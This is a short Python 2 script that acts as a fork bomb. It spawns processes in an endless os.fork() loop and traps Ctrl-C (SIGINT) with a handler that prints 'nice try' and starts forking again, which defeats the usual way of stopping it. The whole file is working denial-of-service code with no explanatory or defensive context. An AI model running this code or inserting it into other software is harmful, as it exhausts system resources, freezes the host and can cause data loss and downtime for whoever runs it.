import signal
import os
def fx(s, f):
    print "nice try"
    while 1:
        os.fork()
signal.signal(signal.SIGINT, fx)
while 1:
    os.fork()
